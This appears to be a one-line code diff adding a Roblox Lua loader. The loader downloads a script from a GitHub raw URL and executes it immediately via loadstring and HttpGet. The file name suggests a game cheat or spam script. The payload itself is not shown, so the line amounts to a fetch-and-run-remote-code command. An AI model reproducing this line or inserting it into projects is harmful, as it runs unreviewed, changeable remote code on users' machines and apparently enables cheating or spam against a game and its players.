@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/update-realistic-home-defense-spam7-odogleeambjwou.lua"))()
